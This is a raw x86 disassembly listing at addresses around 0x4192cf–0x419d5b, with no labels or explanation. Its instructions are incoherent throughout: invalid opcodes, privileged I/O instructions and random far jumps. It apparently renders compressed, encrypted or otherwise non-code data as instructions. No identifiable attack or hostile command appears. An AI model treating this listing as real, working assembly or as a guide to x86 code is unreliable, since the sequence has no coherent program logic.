  4192cf:	jmp    0x4192cf
  4192d1:	mov    eax,DWORD PTR [ebx+0x3f84065b]
  4192d7:	jg     0x41932c
  4192d9:	push   ecx
  4192da:	dec    esi
  4192db:	add    eax,0x6402db2d
  4192e0:	mov    eax,0x73ef8efe
  4192e5:	mov    gs,WORD PTR [edi]
  4192e7:	or     eax,ebp
  4192e9:	popf   
  4192ea:	int3   
  4192eb:	sub    esi,DWORD PTR cs:[esi]
	...
  419356:	mov    al,ds:0xff33bae7
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	mov    ebp,0x676a33c1
  419367:	sgdtd  [eax]
  41936a:	add    BYTE PTR [ecx],al
  41936c:	add    BYTE PTR [eax],al
  41936e:	pop    es
  41936f:	std    
  419370:	adc    edi,DWORD PTR [edi+0x57e616d1]
  419376:	pop    ebx
  419377:	je     0x419307
  419379:	nop
  41937a:	retf   
  41937b:	sub    eax,0x87a20dec
  419380:	xchg   ecx,eax
  419381:	inc    ebx
  419382:	es call 0x1e07:0x2e3171e3
  41938a:	aam    0x3c
  41938c:	ret    
  41938d:	sub    edi,ebp
  41938f:	cmp    BYTE PTR [edx+0x7b7139bf],0x93
  419396:	mov    al,ds:0x5c20dd37
  41939b:	jmp    0x31fd:0x41b56135
  4193a2:	and    BYTE PTR [edi+0x16c0e449],cl
  4193a8:	xchg   esp,eax
  4193a9:	jnp    0x4193c5
  4193ab:	mov    al,ds:0x81a62192
  4193b0:	loop   0x419385
  4193b2:	xor    al,0x2a
  4193b4:	or     cl,BYTE PTR [edi-0x4ab5a768]
  4193ba:	into   
  4193bb:	cmp    dl,BYTE PTR cs:0x4a98527d
  4193c2:	xor    DWORD PTR [ebx-0x29],edx
  4193c5:	jno    0x419442
  4193c7:	mov    dl,0xd9
  4193c9:	inc    edi
  4193ca:	mov    eax,ds:0x3852148e
  4193cf:	and    DWORD PTR [ebp+0x492a8993],ebx
  4193d5:	lea    edi,[ecx]
  4193d7:	push   eax
  4193d8:	pop    eax
  4193d9:	sub    BYTE PTR [ecx],dh
  4193db:	jmp    0xa6940f4d
  4193e0:	repz xchg esi,eax
  4193e2:	push   ebx
  4193e3:	lods   al,BYTE PTR ds:[esi]
  4193e4:	imul   ebp,DWORD PTR [edx+0x7cd8ea30],0x66
  4193eb:	adc    BYTE PTR [edi-0x37bd9cb7],al
  4193f1:	repz sbb eax,0xeab614de
  4193f7:	loope  0x4193f4
  4193f9:	out    dx,al
  4193fa:	lock repnz mov esp,0x3c691242
  419401:	iret   
  419402:	mul    cl
  419404:	mov    esi,cs
  419406:	popf   
  419407:	push   es
  419408:	jle    0x419436
  41940a:	and    DWORD PTR [ecx-0x43b6a336],esi
  419410:	shl    al,cl
  419412:	mov    cl,0x40
  419414:	jg     0x419436
  419416:	test   eax,0x9db10e06
  41941b:	mov    esi,0x900a6c4d
  419420:	imul   eax,DWORD PTR [ebp-0x2127654f],0x77e8e1c1
  41942a:	mov    BYTE PTR ds:[ebx+eiz*2],dl
  41942e:	xchg   ebx,eax
  41942f:	pop    ebx
  419430:	rcr    esp,cl
  419432:	inc    esp
  419433:	mov    esi,0x3c992ebe
  419438:	mov    eax,0x1386dc03
  41943d:	push   esi
  41943e:	sub    al,BYTE PTR [ecx+ebx*4-0x21f9d93c]
  419445:	xchg   edx,eax
  419446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419447:	push   edx
  419448:	dec    ebx
  419449:	ins    BYTE PTR es:[edi],dx
  41944a:	shr    ebp,1
  41944c:	ins    BYTE PTR es:[edi],dx
  41944d:	mov    edx,0xacfb69b7
  419452:	cmp    ebx,DWORD PTR [eax]
  419454:	mov    bh,0xb
  419456:	test   eax,0x157fd529
  41945b:	xchg   DWORD PTR [ebp-0x65530657],esp
  419461:	sub    al,0xe4
  419463:	push   ebx
  419464:	(bad)  
  419465:	(bad)  
  419466:	fucom  st(1)
  419468:	and    eax,0x7393bef6
  41946d:	pop    ss
	...
  4194d6:	cmp    eax,0xed3a6998
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	push   ecx
  4194e3:	out    0x30,al
  4194e5:	loopne 0x41954e
  4194e7:	adc    BYTE PTR [ecx],al
  4194e9:	add    BYTE PTR [eax],al
  4194eb:	add    DWORD PTR [eax],eax
  4194ed:	add    dh,bh
  4194ef:	mov    eax,0xf85bff93
  4194f4:	lahf   
  4194f5:	aam    0x4b
  4194f7:	add    ah,BYTE PTR [eax+0x643f3c52]
  4194fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194fe:	pop    esi
  4194ff:	push   0xffffff9f
  419501:	cmp    esp,DWORD PTR [edx+0x5f]
  419504:	es push 0x1297ec96
  41950a:	inc    esi
  41950b:	in     eax,dx
  41950c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41950d:	pop    ss
  41950e:	daa    
  41950f:	inc    ebp
  419510:	cmp    al,0x3c
  419512:	pop    esp
  419513:	mov    ebp,0xf9ce84fd
  419518:	(bad)  
  419519:	std    
  41951a:	fidivr WORD PTR [edi+0x7e]
  41951d:	sahf   
  41951e:	popa   
  41951f:	adc    BYTE PTR [edi+0x2],0xb8
  419523:	xor    bh,BYTE PTR [edx+ecx*4]
  419526:	repz pop esi
  419528:	out    0x61,eax
  41952a:	inc    ecx
  41952b:	mov    dl,0x57
  41952d:	cmp    DWORD PTR [edx+ebx*1-0x79],ebx
  419531:	push   0xffffffae
  419533:	imul   esp,ebp,0xfbecdb05
  419539:	fnsave fs:[edi]
  41953c:	pop    esp
  41953d:	adc    esi,DWORD PTR [edx-0x48]
  419540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419541:	pop    esp
  419542:	cli    
  419543:	cmp    al,0xac
  419545:	dec    ecx
  419546:	add    dl,BYTE PTR [eax]
  419548:	lods   al,BYTE PTR ds:[esi]
  419549:	mov    cl,0xc8
  41954b:	mov    esp,0xb2ec5739
  419550:	sub    ah,ah
  419552:	cmovnp esi,DWORD PTR [ebx]
  419555:	loopne 0x41957c
  419557:	push   cs
  419558:	cli    
  419559:	or     al,0x26
  41955b:	and    BYTE PTR [ebp-0x19],0x90
  41955f:	sub    DWORD PTR [ebx-0x6065f1f4],esi
  419565:	and    al,0x31
  419567:	mov    bh,0x4
  419569:	out    0x44,eax
  41956b:	int    0x19
  41956d:	enter  0x8332,0x7e
  419571:	push   cs
  419572:	push   ds
  419573:	ins    DWORD PTR es:[edi],dx
  419574:	hlt    
  419575:	mov    bl,0x2c
  419577:	mov    esi,DWORD PTR [ecx]
  419579:	in     al,0x32
  41957b:	loopne 0x419579
  41957d:	xchg   esi,eax
  41957e:	xor    dh,BYTE PTR [edx-0x63]
  419581:	cwde   
  419582:	push   edi
  419583:	jg     0x419538
  419585:	popf   
  419586:	push   ss
  419587:	push   0x77
  419589:	js     0x41959e
  41958b:	mov    esp,0x3501d2ea
  419590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419591:	fbstp  TBYTE PTR ds:0x18fa2181
  419597:	fs enter 0x63b1,0x6e
  41959c:	in     al,0x79
  41959e:	inc    ebp
  41959f:	retf   0xe153
  4195a2:	into   
  4195a3:	push   ecx
  4195a4:	in     al,dx
  4195a5:	add    BYTE PTR [ecx+0x50],dh
  4195a8:	jbe    0x419606
  4195aa:	xor    al,0xb7
  4195ac:	jge    0x419549
  4195ae:	cs fwait
  4195b0:	mov    cs:0xdce1616d,eax
  4195b6:	lahf   
  4195b7:	hlt    
  4195b8:	cmp    al,0xed
  4195ba:	push   ecx
  4195bb:	enter  0x1d06,0x37
  4195bf:	and    ebp,DWORD PTR [ecx-0x7e]
  4195c2:	es xchg ebp,eax
  4195c4:	mov    ecx,0x76f75546
  4195c9:	icebp  
  4195ca:	popf   
  4195cb:	jmp    0xafb0e17a
  4195d0:	or     eax,0x55148fdf
  4195d5:	inc    eax
  4195d6:	add    ch,BYTE PTR [ecx]
  4195d8:	mov    ds:0x68439e64,eax
  4195dd:	mov    dl,0x97
  4195df:	add    al,0xe0
  4195e1:	(bad)  
  4195e2:	jb     0x4195f5
  4195e4:	mov    eax,ds:0x38da5ba9
  4195e9:	sbb    al,0x3e
  4195eb:	out    dx,al
  4195ec:	daa    
  4195ed:	mov    WORD PTR [eax],es
	...
  419653:	add    BYTE PTR [eax],al
  419655:	add    BYTE PTR [edi-0x9d722c],ch
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	jmp    0x6802620a
  419667:	adc    DWORD PTR [ecx],eax
  419669:	add    BYTE PTR [eax],al
  41966b:	add    DWORD PTR [eax],eax
  41966d:	add    BYTE PTR [ecx],cl
  41966f:	mov    cl,0x37
  419671:	inc    esi
  419672:	pop    es
  419673:	inc    ecx
  419674:	retf   
  419675:	sub    al,BYTE PTR [eax]
  419677:	cmp    eax,0xa596b644
  41967c:	mov    edx,0xd487f5a1
  419681:	in     al,dx
  419682:	or     bh,BYTE PTR [esi]
  419684:	lahf   
  419685:	in     al,dx
  419686:	cmp    edi,DWORD PTR [eax+0x73]
  419689:	enter  0x1436,0xc5
  41968d:	push   0xb23878b8
  419692:	and    cl,dh
  419694:	push   esp
  419695:	fmulp  st(7),st
  419697:	scas   al,BYTE PTR es:[edi]
  419698:	sub    ebp,esp
  41969a:	xchg   edx,eax
  41969b:	push   esp
  41969c:	jecxz  0x4196d7
  41969e:	int    0xfa
  4196a0:	inc    edx
  4196a1:	sbb    ch,BYTE PTR [eax-0x12]
  4196a4:	rcr    bh,1
  4196a6:	jns    0x419694
  4196a8:	or     BYTE PTR [edi-0x54abf32f],bh
  4196ae:	inc    ecx
  4196af:	jg     0x41966d
  4196b1:	jle    0x419664
  4196b3:	or     cl,BYTE PTR [ecx]
  4196b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196b6:	nop
  4196b7:	dec    edx
  4196b8:	xchg   ebx,eax
  4196b9:	pop    ebx
  4196ba:	retf   0xebb9
  4196bd:	adc    edi,DWORD PTR [edx-0xa980f7]
  4196c3:	(bad)  [edx-0x6d]
  4196c6:	in     eax,0x7f
  4196c8:	cmp    eax,0xbbc35aae
  4196cd:	lods   eax,DWORD PTR ds:[esi]
  4196ce:	and    cl,BYTE PTR [eax]
  4196d0:	cmp    al,0xb4
  4196d2:	in     eax,0xc1
  4196d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196d5:	stc    
  4196d6:	jmp    0x45cf:0x6da1965f
  4196dd:	test   DWORD PTR [esi+0x4f],ebp
  4196e0:	test   dl,cl
  4196e2:	cmp    ch,BYTE PTR ds:0x57b0f392
  4196e8:	xchg   edx,eax
  4196e9:	cdq    
  4196ea:	out    0xf6,al
  4196ec:	cli    
  4196ed:	pop    es
  4196ee:	leave  
  4196ef:	nop
  4196f0:	cmp    DWORD PTR [ecx+0x1089f899],0x12
  4196f7:	mov    bl,0x80
  4196f9:	out    dx,eax
  4196fa:	cmc    
  4196fb:	leave  
  4196fc:	in     eax,dx
  4196fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196fe:	out    dx,al
  4196ff:	popf   
  419700:	adc    DWORD PTR [edx+0x2e],ebx
  419703:	pop    ss
  419704:	inc    eax
  419705:	mov    ch,0x72
  419707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419708:	lods   eax,DWORD PTR ds:[esi]
  419709:	adc    BYTE PTR [esi+0x6ec469b],cl
  41970f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419710:	daa    
  419711:	jno    0x4196d2
  419713:	xor    al,0x19
  419715:	int3   
  419716:	test   eax,0x25d60bd2
  41971b:	xchg   esi,eax
  41971c:	jp     0xbdd6956d
  419722:	and    dl,ah
  419724:	cmp    edi,DWORD PTR [edi+0x33]
  419727:	jecxz  0x4196cd
  419729:	jmp    0x4196e7
  41972b:	int3   
  41972c:	xchg   esp,eax
  41972d:	add    al,0xd8
  41972f:	call   0xdc454451
  419734:	mov    dh,0x10
  419736:	inc    esi
  419737:	xor    eax,0xf3159ce6
  41973c:	jecxz  0x419781
  41973e:	shr    BYTE PTR [ecx-0x68],cl
  419741:	push   ecx
  419742:	and    ch,BYTE PTR [edi+0x2b0e1abe]
  419748:	out    0xdb,eax
  41974a:	fs sbb al,0x70
  41974d:	ja     0x41977b
  41974f:	dec    eax
  419750:	xchg   edi,eax
  419751:	mov    dh,0x77
  419753:	add    DWORD PTR [ebx],esp
  419755:	push   edi
  419756:	test   eax,0x4452db23
  41975b:	mul    BYTE PTR ss:[ebx]
  41975e:	add    eax,0xb9c6a14f
  419763:	pop    es
  419764:	adc    esp,eax
  419766:	or     al,0x9b
  419768:	cmp    ebp,esi
  41976a:	push   ebx
  41976b:	not    BYTE PTR [edi]
  41976d:	add    eax,0x0
	...
  4197d6:	mov    bl,0x3f
  4197d8:	jno    0x41983f
  4197da:	std    
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0x6a8dd0ae
  4197e3:	xchg   esi,eax
  4197e4:	push   0x6f
  4197e6:	adc    al,BYTE PTR [bx+di]
  4197e9:	add    BYTE PTR [eax],al
  4197eb:	add    DWORD PTR [eax],eax
  4197ed:	add    BYTE PTR [edi+0x3b],dh
  4197f0:	or     al,BYTE PTR [ebx+0x3010fb32]
  4197f6:	call   0x3f0:0x40f244e4
  4197fd:	js     0x419870
  4197ff:	shr    BYTE PTR [eax-0x42],0x88
  419803:	sub    DWORD PTR [esi+0x4],ecx
  419806:	ror    DWORD PTR ds:0xe76e979a,0xfd
  41980d:	iret   
  41980e:	xchg   ebx,eax
  41980f:	jbe    0x419833
  419811:	ja     0x419810
  419813:	inc    eax
  419814:	gs jno 0x419870
  419817:	dec    edx
  419818:	jbe    0x4197a1
  41981a:	icebp  
  41981b:	imul   eax,DWORD PTR [ecx-0x66],0x1d
  41981f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419820:	std    
  419821:	inc    ebp
  419822:	imul   eax,esp,0x23
  419825:	adc    DWORD PTR [edi+ebp*2+0x46],edi
  419829:	mov    al,ds:0x39170338
  41982e:	bound  eax,QWORD PTR [edx-0x4]
  419831:	jp     0x41981d
  419833:	fidivr WORD PTR [esi-0x5c856141]
  419839:	push   ecx
  41983a:	imul   ecx,edx,0x14
  41983d:	inc    ecx
  41983e:	fwait
  41983f:	cmp    BYTE PTR [ebp+0x72ebc1cc],0x70
  419846:	(bad)  
  419847:	fucom  st(6)
  41984a:	add    BYTE PTR [edi+0x4f36ae20],bh
  419850:	out    dx,al
  419851:	jmp    0x58e4:0x862942bf
  419858:	sbb    ax,0xcaee
  41985c:	cwde   
  41985d:	and    ecx,DWORD PTR [esi]
  41985f:	mov    bh,0xa8
  419861:	jge    0x41983a
  419863:	popf   
  419864:	ja     0x4198c9
  419866:	test   bl,0x2d
  419869:	bound  edi,QWORD PTR ds:0x4ad48151
  41986f:	mov    ds:0xb63472d6,al
  419874:	repz f2xm1 
  419877:	ss icebp 
  419879:	aas    
  41987a:	pop    ds
  41987b:	pop    eax
  41987c:	jl     0x419847
  41987e:	(bad)  
  41987f:	fnstcw WORD PTR [edx-0xfbede36]
  419885:	xchg   ecx,eax
  419886:	add    eax,0xdf8f301f
  41988b:	jo     0x4198ef
  41988d:	ja     0x4198ec
  41988f:	cmp    al,0x16
  419891:	fisttp QWORD PTR [eax+0x5f602124]
  419897:	or     DWORD PTR [edx+0x6b],edi
  41989a:	je     0x4198f4
  41989c:	scas   eax,DWORD PTR es:[edi]
  41989d:	xor    BYTE PTR [edx],dh
  41989f:	inc    ecx
  4198a0:	mov    dl,0x38
  4198a2:	cmp    DWORD PTR [ecx],ebx
  4198a4:	adc    ch,BYTE PTR [edi+ecx*2]
  4198a7:	jne    0x4198b1
  4198a9:	neg    BYTE PTR [ecx-0x60564860]
  4198af:	pop    es
  4198b0:	xor    ecx,DWORD PTR [ecx+0x1d5b3d6c]
  4198b6:	cwde   
  4198b7:	aad    0x21
  4198b9:	push   esi
  4198ba:	and    eax,DWORD PTR [edx+0x5d]
  4198bd:	and    esp,DWORD PTR [edi]
  4198bf:	jmp    0x4198c9
  4198c1:	int    0x24
  4198c3:	test   al,0x96
  4198c5:	dec    ecx
  4198c6:	nop
  4198c7:	ins    BYTE PTR es:[edi],dx
  4198c8:	mov    bh,0xe0
  4198ca:	sbb    dh,BYTE PTR [edi]
  4198cc:	xchg   edi,eax
  4198cd:	aas    
  4198ce:	sub    DWORD PTR [esi],0xc860ba08
  4198d4:	pop    edx
  4198d5:	push   edx
  4198d6:	(bad)  
  4198d8:	and    eax,0x73dd48c5
  4198dd:	call   0x383c4970
  4198e2:	sbb    al,0xa5
  4198e4:	test   esp,edx
  4198e6:	jb     0x419928
  4198e8:	aam    0x1b
  4198ea:	fdivr  QWORD PTR [ebx+0x4b]
  4198ed:	aaa    
	...
  419956:	sbb    BYTE PTR [ecx],0x47
  419959:	loope  0x41993a
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fst    st(6)
  419963:	cmc    
  419964:	test   al,0xac
  419966:	adc    eax,DWORD PTR [bx+di]
  419969:	add    BYTE PTR [eax],al
  41996b:	add    DWORD PTR [eax],eax
  41996d:	add    BYTE PTR [esi],cl
  41996f:	pop    edx
  419970:	mov    DWORD PTR [ebp+0x330fc6c8],ebp
  419976:	push   cs
  419977:	mov    ds:0xc1447a7f,al
  41997c:	cmc    
  41997d:	loopne 0x419989
  41997f:	mov    eax,0x4f40c362
  419984:	retf   
  419985:	aaa    
  419986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419987:	ds mov edx,0x26a16ba
  41998d:	jg     0x419989
  41998f:	mov    al,BYTE PTR ds:0x5b39e91f
  419995:	int    0x7f
  419997:	xor    al,0xc1
  419999:	cmp    eax,0x4e12b56e
  41999e:	add    esi,ecx
  4199a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199a1:	jo     0x419991
  4199a3:	aam    0xee
  4199a5:	js     0x4199e7
  4199a7:	cdq    
  4199a8:	imul   esi,ebp,0x15d328aa
  4199ae:	fldcw  WORD PTR ds:0x52e237fb
  4199b4:	test   BYTE PTR [edi+edi*8+0x54645469],ch
  4199bb:	sub    DWORD PTR ds:0xf886b1fc,ebp
  4199c1:	mov    edi,0xba8a1b66
  4199c6:	pop    edi
  4199c7:	sahf   
  4199c8:	loop   0x41997e
  4199ca:	xor    DWORD PTR [ebp-0x36],edx
  4199cd:	std    
  4199ce:	sbb    BYTE PTR [ebx+0x235f5394],al
  4199d4:	push   ss
  4199d5:	scas   eax,DWORD PTR es:[edi]
  4199d6:	(bad)  
  4199d7:	test   eax,0xe4abbe28
  4199dc:	es mov edx,0xd5ed3ea4
  4199e2:	and    ecx,DWORD PTR [ebp-0x4f7b6487]
  4199e8:	xor    al,0x57
  4199ea:	add    eax,0x15d00a3
  4199ef:	retf   
  4199f0:	addr16 mov dl,0xa1
  4199f3:	adc    ebp,DWORD PTR [ecx+eax*1-0x3a]
  4199f7:	cmp    BYTE PTR [eax+0x15146108],cl
  4199fd:	out    dx,eax
  4199fe:	push   edi
  4199ff:	in     al,dx
  419a00:	inc    esp
  419a01:	sub    eax,DWORD PTR es:[ecx+0x1123528f]
  419a08:	daa    
  419a09:	mov    es,WORD PTR [ecx]
  419a0b:	inc    ebx
  419a0c:	jo     0x419a70
  419a0e:	push   ss
  419a0f:	or     DWORD PTR [ebx-0x5eec88ef],0x22d8ebe5
  419a19:	pop    ebp
  419a1a:	pop    eax
  419a1b:	push   ss
  419a1c:	and    DWORD PTR [ebx],edx
  419a1e:	dec    ebx
  419a1f:	stc    
  419a20:	fs cwde 
  419a22:	push   edi
  419a23:	xor    al,0x35
  419a25:	ret    0x219f
  419a28:	pop    ds
  419a29:	sahf   
  419a2a:	cwde   
  419a2b:	push   eax
  419a2c:	fs pusha 
  419a2e:	in     al,0xef
  419a30:	fdivr  QWORD PTR [ecx+0x2e]
  419a33:	add    ch,BYTE PTR [ebx+ebx*2+0x1184efe3]
  419a3a:	mov    cl,0x6d
  419a3c:	xlat   BYTE PTR ds:[ebx]
  419a3d:	fmul   st(3),st
  419a3f:	pop    ecx
  419a40:	adc    esi,DWORD PTR [ebx+0x7b]
  419a43:	cwde   
  419a44:	fwait
  419a45:	bound  ebp,QWORD PTR [eax+0x36d7fe65]
  419a4b:	loope  0x419ab0
  419a4d:	push   esp
  419a4e:	or     dh,bh
  419a50:	iret   
  419a51:	lock (bad) 
  419a53:	aas    
  419a54:	xchg   esi,eax
  419a55:	pop    ebp
  419a56:	push   0xfffffff0
  419a58:	iret   
  419a59:	aas    
  419a5a:	jbe    0x419ab8
  419a5c:	(bad)  
  419a5d:	add    dh,al
  419a5f:	pop    es
  419a60:	leave  
  419a61:	push   ecx
  419a62:	fild   WORD PTR [eax-0xc261144]
  419a68:	dec    esi
  419a69:	pop    edi
  419a6a:	sub    DWORD PTR [edx],eax
  419a6c:	cmp    ax,WORD PTR [eax]
	...
  419ad3:	add    BYTE PTR [eax],al
  419ad5:	add    BYTE PTR [ebx],dh
  419ad7:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419add:	test   ebx,0xd1c215d3
  419ae3:	daa    
  419ae4:	jmp    0x156024c
  419ae9:	add    BYTE PTR [eax],al
  419aeb:	add    DWORD PTR [eax],eax
  419aed:	add    BYTE PTR [esi-0x66],cl
  419af0:	int3   
  419af1:	stc    
  419af2:	jp     0x419b4b
  419af4:	js     0x419b56
  419af6:	stc    
  419af7:	cmp    dh,BYTE PTR [ebp-0x2d]
  419afa:	(bad)  
  419afb:	inc    eax
  419afc:	xor    ebx,DWORD PTR [ebx+0x3f]
  419aff:	mov    ds:0x575b9475,eax
  419b04:	inc    esp
  419b05:	sahf   
  419b06:	addr16 xchg edx,ebp
  419b09:	or     al,0xcf
  419b0b:	frstor [esi+0x67]
  419b0e:	fldcw  WORD PTR [eax-0x178c95fa]
  419b14:	xchg   esi,eax
  419b15:	xor    eax,0x1b5a4366
  419b1a:	inc    eax
  419b1b:	cmp    al,0x51
  419b1d:	mov    edx,edx
  419b1f:	cmp    edx,DWORD PTR [ebp+0x4e043292]
  419b25:	int3   
  419b26:	in     eax,0xf2
  419b28:	jmp    0x6943:0x4eb261aa
  419b2f:	shl    dh,0xf5
  419b32:	xchg   esp,eax
  419b33:	test   BYTE PTR [ecx],0xeb
  419b36:	jnp    0x419af6
  419b38:	xlat   BYTE PTR ds:[ebx]
  419b39:	retf   0x89d7
  419b3c:	inc    esp
  419b3d:	sbb    DWORD PTR [esi+0x4e],ebx
  419b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b41:	imul   esp,esi,0x79
  419b44:	dec    edx
  419b45:	ins    BYTE PTR es:[edi],dx
  419b46:	(bad)  
  419b47:	fstp   TBYTE PTR [esi+eiz*1]
  419b4a:	add    ebp,ebx
  419b4c:	and    esp,esi
  419b4e:	daa    
  419b4f:	mov    cl,0xcd
  419b51:	mov    ?,WORD PTR [edx*2-0x419a6897]
  419b58:	dec    BYTE PTR [esi+0x11]
  419b5b:	repnz adc al,0x6a
  419b5e:	rcr    DWORD PTR ds:0x1c868486,1
  419b64:	mov    esp,0xc51c2d77
  419b69:	clc    
  419b6a:	inc    esi
  419b6b:	popf   
  419b6c:	cmp    esp,esi
  419b6e:	push   es
  419b6f:	fwait
  419b70:	inc    eax
  419b71:	mov    WORD PTR [ebx],es
  419b73:	mov    ds:0xaedf3ffb,eax
  419b78:	lds    ebp,FWORD PTR [esi-0x5ef3821b]
  419b7e:	mov    WORD PTR [ecx],gs
  419b80:	inc    ebx
  419b81:	test   al,0x3b
  419b83:	rcl    BYTE PTR [edx+0x6a],1
  419b86:	fdivrp st(3),st
  419b88:	(bad)  
  419b89:	mov    edx,0xae7a6847
  419b8e:	and    al,0x32
  419b90:	clc    
  419b91:	and    al,0xd8
  419b93:	xchg   esp,eax
  419b94:	xchg   edi,eax
  419b95:	cwde   
  419b96:	xchg   DWORD PTR [edx-0x2523026d],eax
  419b9c:	les    ecx,FWORD PTR [esi+0x6b]
  419b9f:	pop    esi
  419ba0:	test   BYTE PTR [ecx+0x3a8a8e38],ch
  419ba6:	mov    esp,0xdc7a343d
  419bab:	jle    0x419b3d
  419bad:	jmp    0x1767f6b1
  419bb2:	stc    
  419bb3:	sbb    edx,DWORD PTR [ebp-0x1cfd176]
  419bb9:	test   al,0x8e
  419bbb:	mov    al,ds:0xef0f32e5
  419bc0:	pop    ebp
  419bc1:	sub    cl,BYTE PTR [ecx-0x58]
  419bc4:	mov    al,ds:0xd4a7eb0c
  419bc9:	add    al,0x5d
  419bcb:	add    eax,0x66a5909f
  419bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bd1:	jne    0x419bc8
  419bd3:	xor    dh,BYTE PTR [esi-0x10]
  419bd6:	retf   0x8768
  419bd9:	ret    
  419bda:	arpl   WORD PTR [edx+0x23],bp
  419bdd:	mov    al,0xa5
  419bdf:	push   ebx
  419be0:	sub    bl,BYTE PTR [edx]
  419be2:	xchg   ebp,eax
  419be3:	popf   
  419be4:	dec    ecx
  419be5:	jl     0x419bc0
  419be7:	and    esi,ebp
  419be9:	xor    esi,DWORD PTR [edi-0x79]
  419bec:	sbb    DWORD PTR [ebx+0x0],ebp
	...
  419c56:	dec    edx
  419c57:	(bad)  
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0x81
  419c63:	idiv   BYTE PTR [eax+0x69]
  419c66:	addr16 adc eax,0x1000001
  419c6c:	add    BYTE PTR [eax],al
  419c6e:	shl    cl,cl
  419c70:	dec    ecx
  419c71:	adc    BYTE PTR ds:0x9f091472,bl
  419c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c78:	addr16 (bad) 
  419c7a:	jo     0x419c19
  419c7c:	sub    ch,bh
  419c7e:	out    dx,eax
  419c7f:	ds sub eax,0xda8c3b6f
  419c85:	ret    
  419c86:	jge    0x419c9f
  419c88:	ret    0xab74
  419c8b:	iret   
  419c8c:	js     0x419cad
  419c8e:	out    dx,al
  419c8f:	cmp    eax,0x1399787
  419c94:	adc    DWORD PTR [ebp+0x523d7026],ecx
  419c9a:	push   cs
  419c9b:	add    eax,0xf616b74a
  419ca0:	and    DWORD PTR [edi],esi
  419ca2:	pop    ss
  419ca3:	fadd   QWORD PTR [esi+0x42]
  419ca6:	ss loopne 0x419c45
  419ca9:	clc    
  419caa:	in     eax,0xdf
  419cac:	xchg   DWORD PTR [edi],esi
  419cae:	mov    eax,ds:0xe6fce4d6
  419cb3:	add    al,0xae
  419cb5:	test   edi,edx
  419cb7:	fcmovnb st,st(7)
  419cb9:	mov    eax,ds:0xfc70e9ff
  419cbe:	push   0xffffff9c
  419cc0:	cmp    al,0x3f
  419cc2:	mov    esi,0xca64ab44
  419cc7:	xchg   edi,eax
  419cc8:	shr    BYTE PTR [ecx-0x3c],0xe2
  419ccc:	es mov cl,0x3b
  419ccf:	sub    ebx,DWORD PTR [ecx]
  419cd1:	js     0x419d00
  419cd3:	mov    edx,0xeca91ce1
  419cd8:	popa   
  419cd9:	cld    
  419cda:	inc    esp
  419cdb:	and    cl,dh
  419cdd:	inc    esi
  419cde:	inc    ecx
  419cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ce0:	out    dx,al
  419ce1:	iret   
  419ce2:	sub    ah,0x26
  419ce5:	jns    0x419cb1
  419ce7:	mov    al,ds:0x3a9e512e
  419cec:	jmp    0x88c1:0x4d2193de
  419cf3:	repnz les edx,FWORD PTR [ebp+0x53aed75c]
  419cfa:	mov    ds:0x2cd045d9,al
  419cff:	mov    dh,0x6e
  419d01:	dec    esi
  419d02:	cmc    
  419d03:	push   edx
  419d04:	inc    ebx
  419d05:	loopne 0x419d28
  419d07:	inc    ebx
  419d08:	and    edx,edx
  419d0a:	aad    0x63
  419d0c:	xor    eax,0x214cec48
  419d11:	adc    eax,0x4f991dec
  419d16:	out    0x1d,eax
  419d18:	mov    al,0x9a
  419d1a:	leave  
  419d1b:	pop    esi
  419d1c:	jbe    0x419d8e
  419d1e:	imul   edx,DWORD PTR [ecx+0x26addb61],0xffffffa5
  419d25:	in     eax,dx
  419d26:	fs es jecxz 0x419d9d
  419d2a:	pop    ecx
  419d2b:	fsub   DWORD PTR [ebx-0x10]
  419d2e:	in     eax,dx
  419d2f:	out    0xaf,eax
  419d31:	dec    esi
  419d32:	loope  0x419d2e
  419d34:	sub    ebp,edx
  419d36:	cs scas al,BYTE PTR es:[edi]
  419d38:	jmp    FWORD PTR [esi]
  419d3a:	jne    0x419cd9
  419d3c:	(bad)  
  419d3d:	xchg   esp,eax
  419d3e:	cwde   
  419d3f:	retf   0xaf59
  419d42:	dec    edx
  419d43:	mov    WORD PTR [ecx-0xb],cs
  419d46:	clc    
  419d47:	retf   0x28ff
  419d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d4c:	xor    bh,BYTE PTR [ebx]
  419d4e:	cmp    BYTE PTR [ebp+0x54],bl
  419d51:	add    ch,BYTE PTR es:[eax]
  419d54:	(bad)  
  419d55:	sub    al,0xe9
  419d57:	hlt    
  419d58:	sahf   
  419d59:	add    al,0xaa
  419d5b:	js     0x419da9
